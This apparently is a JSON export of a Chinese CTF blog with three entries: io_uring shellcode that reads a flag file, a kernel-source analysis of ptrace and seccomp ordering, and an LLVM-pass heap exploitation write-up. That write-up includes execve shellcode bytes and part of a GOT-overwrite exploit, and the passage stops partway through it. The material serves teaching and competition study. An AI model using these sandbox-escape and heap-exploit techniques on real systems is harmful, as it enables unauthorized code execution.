0x1000); sqe[0].opcode = IORING_OP_OPENAT; sqe[0].flags = IOSQE_IO_LINK; sqe[0].fd = -100; sqe[0].addr = flag; sqe[1].opcode = IORING_OP_OPENAT; sqe[1].flags = IOSQE_IO_LINK; sqe[1].fd = -100; sqe[1].addr = flag; sqe[2].opcode = IORING_OP_OPENAT; //sqe[2].flags = IOSQE_IO_LINK; sqe[2].fd = -100; sqe[2].addr = flag; sqe[3].opcode = IORING_OP_READ; //sqe[3].flags = IOSQE_IO_LINK; sqe[3].fd = 4; sqe[3].addr = buff; sqe[3].len = 0x100; sqe[4].opcode = IORING_OP_WRITE; //sqe[4].flags = IOSQE_IO_LINK; sqe[4].fd = 1; sqe[4].addr = buff; sqe[4].len = 0x100; ktail = ring_ptr + 4; io_uring_smp_store_release(ktail, 5); __do_syscall2(425, 0x10, &amp;params); while (1) &#123;&#125;; return 0;&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://v3rdant.cn/categories/CTF/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://v3rdant.cn/tags/linux/"},{"name":"io_uring","slug":"io-uring","permalink":"https://v3rdant.cn/tags/io-uring/"},{"name":"shellcode","slug":"shellcode","permalink":"https://v3rdant.cn/tags/shellcode/"}]},{"title":"Linux.Seccomp-and-Ptrace","slug":"Linux.Seccomp-and-Ptrace","date":"2023-10-30T16:00:00.000Z","updated":"2023-12-07T02:11:35.215Z","comments":true,"path":"Linux.Seccomp-and-Ptrace/","link":"","permalink":"https://v3rdant.cn/Linux.Seccomp-and-Ptrace/","excerpt":"","text":"Background 最近ACTF出现了一个限制非常严格的沙箱，校队里一位pwn师傅搜到了一些用ptrace修改子进程rax来绕过seccomp的wp。 正值校赛，为了出题的事忙得焦头烂额，就没有细想。 但是由于我记得seccomp 是内核hook，而ptrace， 出于一些对调试器的映像，我觉得他对于attach的子进程的寄存器的更改，是在用户态实现的。 那么ptrace的处理应该在seccomp之前，所以我觉得不太可行。 在有时间后，我开始探究了一下，确实不太可行，只是原因跟我想象得不太一样… Intro 在开始之前，先介绍一下三个概念： seccome prctl ptrace 如果没有提到，以上代码均来自linux-6.6 prctl / seccomp prctl 是linux下一个实现进程操控的系统调用。 123456789101112131415161718192021222324252627282930313233343536373839SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3, unsigned long, arg4, unsigned long, arg5)&#123; struct task_struct *me = current; unsigned char comm[sizeof(me-&gt;comm)]; long error; error = security_task_prctl(option, arg2, arg3, arg4, arg5); if (error != -ENOSYS) return error; error = 0; switch (option) &#123; case PR_SET_PDEATHSIG: if (!valid_signal(arg2)) &#123; error = -EINVAL; break; &#125; me-&gt;pdeath_signal = arg2; break; /* ............. 省略若干 ............. */ case PR_GET_SECCOMP: error = prctl_get_seccomp(); break; /* ............. 省略若干 ............. */ default: error = -EINVAL; break; &#125; return error;&#125; 阅读源码和man doc， 可以看到prctl主要实现了两类命令，SET 和 GET ， 即操作进程运行时和获取进程信息。 而seccomp就是基于prctl实现的。 12case PR_SET_SECCOMP: error = prctl_set_seccomp(arg2, (char __user *)arg3); 这里涉及到这样一条调用链 12345--&gt;prctl --&gt;prctl_set_seccomp --&gt;do_seccomp --&gt;seccomp_set_mode_filter --&gt; seccomp_attach_filter seccomp_attach_filter 核心代码如下： 1234filter-&gt;prev = current-&gt;seccomp.filter;seccomp_cache_prepare(filter);current-&gt;seccomp.filter = filter;atomic_inc(&amp;current-&gt;seccomp.filter_count); current是一个全局的指针，主要保存了当前进程的一些信息。 所以，当我们注册seccomp，实际上就是设置了当前进程的filter规则。而什么时候根据这个规则进行过滤呢？ 笔者将在syscall的分析中给出答案。 ptrace ptrace是用来跟踪进程的一个系统调用 当使用ptrace进行 PTRACE_SYSCALL 也就是一般我们劫持系统调用的操作时： ptrace的调用链如下 12345--&gt;PTRACE_SYSCALL --&gt;arch_ptrace --&gt;ptrace_request --&gt; ptrace_resume --&gt;set_task_syscall_work 可以看到最终调用了set_task_syscall_work 宏 12#define set_task_syscall_work(t, fl) \\ set_bit(SYSCALL_WORK_BIT_##fl, &amp;task_thread_info(t)-&gt;syscall_work) 这个宏通过task_thread_info获取了监视的进程的记录结构地址（当被监视进程运行时，此时current指针也指向这个结构，但是此时是监视程序运行时，所以通过task_thread_info取得其地址） 在获取结构体地址后设置了 SYSCALL_WORK_BIT ， 一个标志位， 也就是说，实际上ptrace:PTRACE_SYSCALL 和 prctl: PR_SET_SECCOMP 都只是在进程info上添加了一些信息，最终真正的处理要等到syscall中。 syscall syscall 是如何处理 seccomp 以及ptrace 的呢？ 其经过了如下调用链 12345--&gt;entry_SYSCALL_64 --&gt;do_syscall_64 --&gt;syscall_enter_from_user_mode --&gt;__syscall_enter_from_user_work --&gt;syscall_trace_enter syscall_trace_enter代码如下 12345678910111213141516171819202122232425262728293031323334353637383940static long syscall_trace_enter(struct pt_regs *regs, long syscall, unsigned long work)&#123; long ret = 0; /* * Handle Syscall User Dispatch. This must comes first, since * the ABI here can be something that doesn&#x27;t make sense for * other syscall_work features. */ if (work &amp; SYSCALL_WORK_SYSCALL_USER_DISPATCH) &#123; if (syscall_user_dispatch(regs)) return -1L; &#125; /* Handle ptrace */ if (work &amp; (SYSCALL_WORK_SYSCALL_TRACE | SYSCALL_WORK_SYSCALL_EMU)) &#123; ret = ptrace_report_syscall_entry(regs); if (ret || (work &amp; SYSCALL_WORK_SYSCALL_EMU)) return -1L; &#125; /* Do seccomp after ptrace, to catch any tracer changes. */ if (work &amp; SYSCALL_WORK_SECCOMP) &#123; ret = __secure_computing(NULL); if (ret == -1L) return ret; &#125; /* Either of the above might have changed the syscall number */ syscall = syscall_get_nr(current, regs); if (unlikely(work &amp; SYSCALL_WORK_SYSCALL_TRACEPOINT)) trace_sys_enter(regs, syscall); syscall_enter_audit(regs, syscall); return ret ? : syscall;&#125; 其中work由 READ_ONCE(current_thread_info()-&gt;syscall_work) 得到 12345678910static __always_inline long__syscall_enter_from_user_work(struct pt_regs *regs, long syscall)&#123; unsigned long work = READ_ONCE(current_thread_info()-&gt;syscall_work); if (work &amp; SYSCALL_WORK_ENTER) syscall = syscall_trace_enter(regs, syscall, work); return syscall;&#125; 由前面的分析我们可以知道， ptrace最终就是设置了SYSCALL_WORK_BIT 也因此，这里的检测和处理，如注释所说的，就是处理我们在前面看到的seccomp和ptrace。 再看 PTRACE_SYSCALL 的实际处理函数 ptrace_report_syscall。 其中发送了SYSTRAP信号， 会让当前进程阻塞。等待ptrace的处理。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/* * ptrace report for syscall entry and exit looks identical. */static inline int ptrace_report_syscall(unsigned long message)&#123; int ptrace = current-&gt;ptrace; int signr; if (!(ptrace &amp; PT_PTRACED)) return 0; signr = ptrace_notify(SIGTRAP | ((ptrace &amp; PT_TRACESYSGOOD) ? 0x80 : 0), message); /* * this isn&#x27;t the same as continuing with a signal, but it will do * for normal use. strace only continues with a signal if the * stopping signal is not SIGTRAP. -brl */ if (signr) send_sig(signr, current, 1); return fatal_signal_pending(current);&#125;/** * ptrace_report_syscall_entry - task is about to attempt a system call * @regs: user register state of current task * * This will be called if %SYSCALL_WORK_SYSCALL_TRACE or * %SYSCALL_WORK_SYSCALL_EMU have been set, when the current task has just * entered the kernel for a system call. Full user register state is * available here. Changing the values in @regs can affect the system * call number and arguments to be tried. It is safe to block here, * preventing the system call from beginning. * * Returns zero normally, or nonzero if the calling arch code should abort * the system call. That must prevent normal entry so no system call is * made. If @task ever returns to user mode after this, its register state * is unspecified, but should be something harmless like an %ENOSYS error * return. It should preserve enough information so that syscall_rollback() * can work (see asm-generic/syscall.h). * * Called without locks, just after entering kernel mode. */static inline __must_check int ptrace_report_syscall_entry( struct pt_regs *regs)&#123; return ptrace_report_syscall(PTRACE_EVENTMSG_SYSCALL_ENTRY);&#125; 正如注释所说，通过ptrace拦截系统调用后，对于寄存器的修改，都是在这个时间发生的。 This will be called if %SYSCALL_WORK_SYSCALL_TRACE or %SYSCALL_WORK_SYSCALL_EMU have been set, when the current task has just entered the kernel for a system call. Full user register state is available here. Changing the values in @regs can affect the system call number and arguments to be tried. It is safe to block here, preventing the system call from beginning.&gt; 而这一处理，在seccomp前面，所以即使通过ptrace拦截系统调用修改系统调用号后，seccomp还是会进行检查。 那为什么网上会有相关WP呢？ 以下为linux-4.7的代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126/* * We can return 0 to resume the syscall or anything else to go to phase * 2. If we resume the syscall, we need to put something appropriate in * regs-&gt;orig_ax. * * NB: We don&#x27;t have full pt_regs here, but regs-&gt;orig_ax and regs-&gt;ax * are fully functional. * * For phase 2&#x27;s benefit, our return value is: * 0: resume the syscall * 1: go to phase 2; no seccomp phase 2 needed * anything else: go to phase 2; pass return value to seccomp */unsigned long syscall_trace_enter_phase1(struct pt_regs *regs, u32 arch)&#123; struct thread_info *ti = pt_regs_to_thread_info(regs); unsigned long ret = 0; u32 work; if (IS_ENABLED(CONFIG_DEBUG_ENTRY)) BUG_ON(regs != task_pt_regs(current)); work = ACCESS_ONCE(ti-&gt;flags) &amp; _TIF_WORK_SYSCALL_ENTRY;#ifdef CONFIG_SECCOMP /* * Do seccomp first -- it should minimize exposure of other * code, and keeping seccomp fast is probably more valuable * than the rest of this. */ if (work &amp; _TIF_SECCOMP) &#123; struct seccomp_data sd; sd.arch = arch; sd.nr = regs-&gt;orig_ax; sd.instruction_pointer = regs-&gt;ip;#ifdef CONFIG_X86_64 if (arch == AUDIT_ARCH_X86_64) &#123; sd.args[0] = regs-&gt;di; sd.args[1] = regs-&gt;si; sd.args[2] = regs-&gt;dx; sd.args[3] = regs-&gt;r10; sd.args[4] = regs-&gt;r8; sd.args[5] = regs-&gt;r9; &#125; else#endif &#123; sd.args[0] = regs-&gt;bx; sd.args[1] = regs-&gt;cx; sd.args[2] = regs-&gt;dx; sd.args[3] = regs-&gt;si; sd.args[4] = regs-&gt;di; sd.args[5] = regs-&gt;bp; &#125; BUILD_BUG_ON(SECCOMP_PHASE1_OK != 0); BUILD_BUG_ON(SECCOMP_PHASE1_SKIP != 1); ret = seccomp_phase1(&amp;sd); if (ret == SECCOMP_PHASE1_SKIP) &#123; regs-&gt;orig_ax = -1; ret = 0; &#125; else if (ret != SECCOMP_PHASE1_OK) &#123; return ret; /* Go directly to phase 2 */ &#125; work &amp;= ~_TIF_SECCOMP; &#125;#endif /* Do our best to finish without phase 2. */ if (work == 0) return ret; /* seccomp and/or nohz only (ret == 0 here) */#ifdef CONFIG_AUDITSYSCALL if (work == _TIF_SYSCALL_AUDIT) &#123; /* * If there is no more work to be done except auditing, * then audit in phase 1. Phase 2 always audits, so, if * we audit here, then we can&#x27;t go on to phase 2. */ do_audit_syscall_entry(regs, arch); return 0; &#125;#endif return 1; /* Something is enabled that we can&#x27;t handle in phase 1 */&#125;/* Returns the syscall nr to run (which should match regs-&gt;orig_ax). */long syscall_trace_enter_phase2(struct pt_regs *regs, u32 arch, unsigned long phase1_result)&#123; struct thread_info *ti = pt_regs_to_thread_info(regs); long ret = 0; u32 work = ACCESS_ONCE(ti-&gt;flags) &amp; _TIF_WORK_SYSCALL_ENTRY; if (IS_ENABLED(CONFIG_DEBUG_ENTRY)) BUG_ON(regs != task_pt_regs(current));#ifdef CONFIG_SECCOMP /* * Call seccomp_phase2 before running the other hooks so that * they can see any changes made by a seccomp tracer. */ if (phase1_result &gt; 1 &amp;&amp; seccomp_phase2(phase1_result)) &#123; /* seccomp failures shouldn&#x27;t expose any additional code. */ return -1; &#125;#endif if (unlikely(work &amp; _TIF_SYSCALL_EMU)) ret = -1L; if ((ret || test_thread_flag(TIF_SYSCALL_TRACE)) &amp;&amp; tracehook_report_syscall_entry(regs)) ret = -1L; if (unlikely(test_thread_flag(TIF_SYSCALL_TRACEPOINT))) trace_sys_enter(regs, regs-&gt;orig_ax); do_audit_syscall_entry(regs, arch); return ret ?: regs-&gt;orig_ax;&#125; 对seccomp 的处理在 syscall_trace_enter_phase1， 而处理ptrace的tracehook_report_syscall_entry 在syscall_trace_enter_phase2 seccomp的过滤在ptrace之前。 所以，在4.8以下，这种攻击是可以实现的。 Tricks 那么ptrace在绕过沙箱时是不是完全没有用了呢，也不是。 在和@cnitlrt 师傅交流后，得知了一个很骚操作的办法。 使用nc 连接两次，产生了两个进程，如果能在第二个进程运行前，通过ptrace截停prctl的调用，改成随便一个无关调用，就可以实现沙盒的绕过 这里存在三个问题： 首先是如何获得第二个进程的pid： 在CTF这种比较纯净的环境，可以认为两个进程PID相近，把当前进程的PID加1或者加2就可以。 其次是如何实现在第二次进程运行seccomp前的窗口期实现ptrace上此进程： 可以通过在一个进程使用ptrace attach轮询，直到执行成功返回1。不过也有失败的概率。 第三也是最终限制了这个tricks的使用的是，我们都知道，ptrace默认只能attach到自己的子进程，除非 /proc/sys/kernel/yama/ptrace_scope 设置为0， 在个人用户使用时，为了方便gdb等调试器，这个选项一般是0， 然而，当我随便开了个ubuntu的docker看了一下后： 12$ cat proc/sys/kernel/yama/ptrace_scope 1 啊这，这，那没事了","categories":[{"name":"CTF","slug":"CTF","permalink":"https://v3rdant.cn/categories/CTF/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://v3rdant.cn/tags/Pwn/"},{"name":"linux","slug":"linux","permalink":"https://v3rdant.cn/tags/linux/"}]},{"title":"I wanna be a llvm passer","slug":"Pwn.I-Wanna-be-A-LLVM-Passer","date":"2023-06-22T16:00:00.000Z","updated":"2023-12-07T02:11:35.215Z","comments":true,"path":"Pwn.I-Wanna-be-A-LLVM-Passer/","link":"","permalink":"https://v3rdant.cn/Pwn.I-Wanna-be-A-LLVM-Passer/","excerpt":"","text":"overview 华中赛遇到了一个llvm的题，顺手系统总结一下llvm pass吧。 首先简单介绍一下llvm，llvm是一套用C++编写的编译器基础设施。LLVM Pass提供了一些可供重写的函数，本义是用来实现一些优化。而Pwn的llvm pass类题，就是重写了runOnFunction函数。 ll和bc是llvm生成的IR的两种形式，分别是适合人类阅读的文本形式和二进制形式，可以用如下命令转换。 12345.c -&gt; .ll：clang -emit-llvm -S a.c -o a.ll.c -&gt; .bc: clang -emit-llvm -c a.c -o a.bc.ll -&gt; .bc: llvm-as a.ll -o a.bc.bc -&gt; .ll: llvm-dis a.bc -o a.ll.bc -&gt; .s: llc a.bc -o a.s 由于笔者实机为Fedora, 所以笔者使用ubuntu docker 来安装llvm和clang，在需要调试时，将相应共享库导入到本地，用patchelf来更改软链接，还是在docker中配置调试环境比较方便.jpg 启动一个ubuntu:20.04的container，如下安装并配置好调试环境即可 12345678sudo apt install clang-8sudo apt install llvm-8 sudo apt install clang-10sudo apt install llvm-10 sudo apt install clang-12sudo apt install llvm-12 opt就是所要pwn掉的对象，他是llvm的优化器，可以加载指定pass模块和exp对应ll代码，由于opt一般无PIE保护，所以一般通过覆盖got表来实现劫持控制流。自己安装的opt路径为/usr/lib/llvm-xx/bin/opt so分析 如何定位重写的 runOnFunction 函数呢? 首先定位到.data.rel.ro 段的vtable，其最后一项就是此函数。 另一种定位方法： 首先找到注册的Pass的字符串。 这里IDA没有自动识别，将Hello字符串更改类型并命名 然后通过交叉引用找到Pass注册函数 跟进sub_7e10 跟进sub_7F90 继续跟进 此处unk_FD48即为虚表地址。 函数对照 getName()：获取当前处理的函数名 getOpcodeName()：获取操作符名称 getOpcodeName()函数用于获取指令的操作符的名称 getNumOperands()用于获取指令的操作数的个数 getOpcode()函数用于获取指令的操作符编号，在/usr/include/llvm-xx/llvm/IR/Instruction.def可以找到编号和操作符的对应表 getOperand(i)是用于获取第i个操作数（在这里就是获取所调用函数的第i个参数），getArgOperand()函数与其用法类似，但只能获取参数，getZExtValue()即get Zero Extended Value，也就是将获取的操作数转为无符号扩展整数。 调试 调试实际上是调试opt，所以采用如下方法调试即可: 1gdb ./opt 先用gdb调试opt 12set args -load ./&lt;pass so name&gt;.so -&lt;pass name&gt; exp.llstart 再设置参数加载pass 1n &lt;一系列call指令数&gt; 在开始的200左右个call指令后，pass.so才会加载进内存 1b *&lt;pass加载地址&gt;+&lt;偏移&gt; 注意事项 heap 由于opt是一个较为复杂的软件，运行过程中，存在相当多的无关chunk的分配，而且，由于exp.ll会被加载进入内存，即使exp变动的很小，chunk布局也可能会发生改变，因此需要小心注意chunk之间的偏移，可以考虑预先多分配一些chunk填充，方便之后更改偏移。 got 如何选择覆写的got表？ 首先通过调用链确定runOnFunction 的调用位置。 然后通过finish 返回到main后，查找后面使用到的got表即可 example 2023-ciscn-huazhong-lvm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266__int64 __fastcall sub_8050(__int64 a1, llvm::Function *a2)&#123; __int64 v2; // rdx llvm::BasicBlock *v3; // rax llvm::BasicBlock *v4; // rax llvm::Instruction *v5; // rax llvm::Value *CalledFunction; // rax __int64 v7; // rdx __int64 ArgOperand; // rax llvm::ConstantInt *v9; // rax __int64 v10; // rax __int64 v11; // rax llvm::User *v12; // rax __int64 v13; // rax llvm::ConstantInt *v14; // rax llvm::User *v15; // rax __int64 v16; // rax llvm::ConstantInt *v17; // rax __int64 v18; // rax llvm::ConstantInt *v19; // rax __int64 v20; // rax llvm::ConstantInt *v21; // rax llvm::User *v22; // rax __int64 v23; // rax llvm::ConstantInt *v24; // rax __int64 v25; // rax llvm::ConstantInt *v26; // rax char v28; // [rsp+Eh] [rbp-182h] char v29; // [rsp+Fh] [rbp-181h] int v30; // [rsp+10h] [rbp-180h] int v31; // [rsp+14h] [rbp-17Ch] __int64 v32; // [rsp+18h] [rbp-178h] BYREF __int64 v33; // [rsp+20h] [rbp-170h] BYREF __int64 v34[2]; // [rsp+28h] [rbp-168h] BYREF __int64 v35; // [rsp+38h] [rbp-158h] __int64 v36; // [rsp+40h] [rbp-150h] __int64 v37[2]; // [rsp+48h] [rbp-148h] BYREF __int64 v38; // [rsp+58h] [rbp-138h] __int64 v39; // [rsp+60h] [rbp-130h] int v40; // [rsp+6Ch] [rbp-124h] int v41; // [rsp+70h] [rbp-120h] int v42; // [rsp+74h] [rbp-11Ch] __int64 v43; // [rsp+78h] [rbp-118h] BYREF __int64 v44; // [rsp+80h] [rbp-110h] BYREF __int64 v45; // [rsp+88h] [rbp-108h] BYREF __int64 v46[2]; // [rsp+90h] [rbp-100h] BYREF __int64 v47; // [rsp+A0h] [rbp-F0h] __int64 v48; // [rsp+A8h] [rbp-E8h] int v49; // [rsp+B4h] [rbp-DCh] __int64 v50; // [rsp+B8h] [rbp-D8h] BYREF _QWORD v51[2]; // [rsp+C0h] [rbp-D0h] BYREF __int64 v52; // [rsp+D0h] [rbp-C0h] __int64 v53; // [rsp+D8h] [rbp-B8h] int i; // [rsp+E4h] [rbp-ACh] void *v55; // [rsp+E8h] [rbp-A8h] int ZExtValue; // [rsp+F4h] [rbp-9Ch] __int64 Operand; // [rsp+F8h] [rbp-98h] BYREF _QWORD v58[2]; // [rsp+100h] [rbp-90h] BYREF __int64 v59; // [rsp+110h] [rbp-80h] __int64 v60; // [rsp+118h] [rbp-78h] __int64 Name; // [rsp+120h] [rbp-70h] __int64 v62; // [rsp+128h] [rbp-68h] llvm::CallBase *v63; // [rsp+130h] [rbp-60h] __int64 v64; // [rsp+138h] [rbp-58h] BYREF __int64 v65; // [rsp+140h] [rbp-50h] BYREF __int64 v66; // [rsp+148h] [rbp-48h] BYREF __int64 v67; // [rsp+150h] [rbp-40h] BYREF __int64 v68; // [rsp+158h] [rbp-38h] BYREF _QWORD v69[3]; // [rsp+160h] [rbp-30h] BYREF llvm::Function *v70; // [rsp+178h] [rbp-18h] __int64 v71; // [rsp+180h] [rbp-10h] char v72; // [rsp+18Fh] [rbp-1h] v71 = a1; v70 = a2; v69[1] = llvm::Value::getName(a2); v69[2] = v2; v68 = llvm::Function::end(a2); llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,true&gt;::ilist_iterator&lt;false&gt;( v69, &amp;v68, 0LL); v66 = llvm::Function::begin(v70); llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,true&gt;::ilist_iterator&lt;false&gt;( &amp;v67, &amp;v66, 0LL); while ( (llvm::operator!=(&amp;v67, v69) &amp; 1) != 0 ) &#123; v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,true&gt;::operator-&gt;(&amp;v67); v65 = llvm::BasicBlock::begin(v3); v4 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,true&gt;::operator-&gt;(&amp;v67); v64 = llvm::BasicBlock::end(v4); while ( (llvm::operator!=(&amp;v65, &amp;v64) &amp; 1) != 0 ) &#123; v5 = (llvm::Instruction *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,false,false,void&gt;,false,true&gt;::operator-&gt;(&amp;v65); if ( (unsigned int)llvm::Instruction::getOpcode(v5) == 56 ) &#123; v63 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,false,false,void&gt;,false,true&gt;&gt;(&amp;v65); CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v63); Name = llvm::Value::getName(CalledFunction); v62 = v7; v59 = Name; v60 = v7; llvm::StringRef::StringRef((std::_Function_base *)v58, &quot;Add&quot;); if ( (llvm::operator==(v59, v60, v58[0], v58[1]) &amp; 1) != 0 ) &#123; Operand = llvm::CallBase::getOperand(v63, 0); if ( (llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;Operand) &amp; 1) == 0 ) &#123; v10 = llvm::errs((llvm *)&amp;Operand); v11 = llvm::raw_ostream::operator&lt;&lt;(v10, &quot;Error argument&quot;); llvm::raw_ostream::operator&lt;&lt;(v11, &quot;\\n&quot;); v72 = 0; return v72 &amp; 1; &#125; ArgOperand = llvm::CallBase::getArgOperand(v63, 0); v9 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand); ZExtValue = llvm::ConstantInt::getZExtValue(v9); v55 = 0LL; v55 = malloc(ZExtValue); if ( !v55 ) &#123; perror(&quot;malloc&quot;); v72 = 0; return v72 &amp; 1; &#125; for ( i = 0; i &lt; 32; ++i ) &#123; if ( !*((_QWORD *)&amp;addrList + i) ) &#123; *((_QWORD *)&amp;addrList + i) = v55; break; &#125; &#125; &#125; else &#123; v52 = Name; v53 = v62; llvm::StringRef::StringRef((std::_Function_base *)v51, &quot;Del&quot;); if ( (llvm::operator==(v52, v53, v51[0], v51[1]) &amp; 1) != 0 ) &#123; v12 = (llvm::User *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,false,false,void&gt;,false,true&gt;::operator-&gt;(&amp;v65); if ( (unsigned int)llvm::User::getNumOperands(v12) != 2 ) &#123; printf(&quot;ERROR argument size&quot;); v72 = 0; return v72 &amp; 1; &#125; v50 = llvm::CallBase::getOperand(v63, 0); if ( (llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;v50) &amp; 1) != 0 ) &#123; v13 = llvm::CallBase::getArgOperand(v63, 0); v14 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v13); v49 = llvm::ConstantInt::getZExtValue(v14); if ( !*((_QWORD *)&amp;addrList + v49) || v49 &gt;= 32 ) &#123; v72 = 0; return v72 &amp; 1; &#125; free(*((void **)&amp;addrList + v49)); *((_QWORD *)&amp;addrList + v49) = 0LL; &#125; &#125; else &#123; v47 = Name; v48 = v62; llvm::StringRef::StringRef((std::_Function_base *)v46, &quot;Edit&quot;); if ( (llvm::operator==(v47, v48, v46[0], v46[1]) &amp; 1) != 0 ) &#123; v15 = (llvm::User *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,false,false,void&gt;,false,true&gt;::operator-&gt;(&amp;v65); if ( (unsigned int)llvm::User::getNumOperands(v15) != 4 ) goto LABEL_28; v45 = llvm::CallBase::getOperand(v63, 0); v29 = 0; if ( (llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;v45) &amp; 1) != 0 ) &#123; v44 = llvm::CallBase::getOperand(v63, 1u); v29 = 0; if ( (llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;v44) &amp; 1) != 0 ) &#123; v43 = llvm::CallBase::getOperand(v63, 2u); v29 = llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;v43); &#125; &#125; if ( (v29 &amp; 1) != 0 ) &#123; v16 = llvm::CallBase::getArgOperand(v63, 0); v17 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v16); v42 = llvm::ConstantInt::getZExtValue(v17); v18 = llvm::CallBase::getArgOperand(v63, 1u); v19 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v18); v41 = llvm::ConstantInt::getZExtValue(v19); v20 = llvm::CallBase::getArgOperand(v63, 2u); v21 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v20); v40 = llvm::ConstantInt::getZExtValue(v21); if ( !*((_QWORD *)&amp;addrList + v42) || v42 &gt;= 32 ) &#123; v72 = 0; return v72 &amp; 1; &#125; *(_DWORD *)(*((_QWORD *)&amp;addrList + v42) + 4LL * v41) = v40; &#125; &#125; else &#123; v38 = Name; v39 = v62; llvm::StringRef::StringRef((std::_Function_base *)v37, &quot;Alloc&quot;); if ( (llvm::operator==(v38, v39, v37[0], v37[1]) &amp; 1) != 0 ) &#123; mmap(&amp;off_10000, 0x1000uLL, 7, 33, 0, 0LL); &#125; else &#123; v35 = Name; v36 = v62; llvm::StringRef::StringRef((std::_Function_base *)v34, &quot;EditAlloc&quot;); if ( (llvm::operator==(v35, v36, v34[0], v34[1]) &amp; 1) != 0 ) &#123; v22 = (llvm::User *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,false,false,void&gt;,false,true&gt;::operator-&gt;(&amp;v65); if ( (unsigned int)llvm::User::getNumOperands(v22) != 3 ) &#123;LABEL_28: printf(&quot;Error argument size&quot;); v72 = 0; return v72 &amp; 1; &#125; v33 = llvm::CallBase::getOperand(v63, 0); v28 = 0; if ( (llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;v33) &amp; 1) != 0 ) &#123; v32 = llvm::CallBase::getOperand(v63, 1u); v28 = llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;v32); &#125; if ( (v28 &amp; 1) != 0 ) &#123; v23 = llvm::CallBase::getArgOperand(v63, 0); v24 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v23); v31 = llvm::ConstantInt::getZExtValue(v24); v25 = llvm::CallBase::getArgOperand(v63, 1u); v26 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v25); v30 = llvm::ConstantInt::getZExtValue(v26); if ( !*((_QWORD *)&amp;addrList + v31) || v31 &gt;= 32 || v30 &gt;= 256 ) &#123; v72 = 0; return v72 &amp; 1; &#125; *(_DWORD *)(v30 + 0x10000) = **((_DWORD **)&amp;addrList + v31); &#125; &#125; &#125; &#125; &#125; &#125; &#125; llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,false,false,void&gt;,false,true&gt;::operator++(&amp;v65); &#125; llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,true&gt;::operator++(&amp;v67); &#125; v72 = 0; return v72 &amp; 1;&#125; 实现了一个类似菜单堆的面板，通过Alloc可以分配一块位于0x10000的可执行区域，在此写入shellcode，Edit存在溢出，可以使用负偏移从而改写tcache管理结构体，这里考虑将0x40的链表改写成oprator delete(void*) 的got表的位置，并且将其剩余数量改写为1，以防止继续分配coredump，之后覆写got表为0x10000。 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;stdio.h&gt;void Add(int size);// Add any sizevoid Del(int idx);// Delvoid Edit(int idx, int offset, unsigned int num);// Allocvoid Alloc(void);void EditAlloc(int num, int offset);// write got/*&quot;\\x48\\x31\\xf6\\x560x56f63148\\x48\\xbf\\x2f\\x620x622fbf48\\x69\\x6e\\x2f\\x2f0x2f2f6e69\\x73\\x68\\x57\\x54&quot;0x54576873&quot;\\x5f\\xb0\\x3b\\x990x993bb05f\\x0f\\x05&quot;*/int main()&#123; Add(0); // 0 Edit(0, 0, 0x56f63148); Add(0); // 1 Edit(1, 0, 0x622fbf48); Add(0); // 2 Edit(2, 0, 0x2f2f6e69); Add(0); // 3 Edit(3, 0, 0x54576873); Add(0); // 4 Edit(4, 0, 0x993bb05f); Add(0); // 5 Edit(5, 0, 0x050f); Alloc(); EditAlloc(0, 0); EditAlloc(1, 4); EditAlloc(2, 4 * 2); EditAlloc(3, 4 * 3); 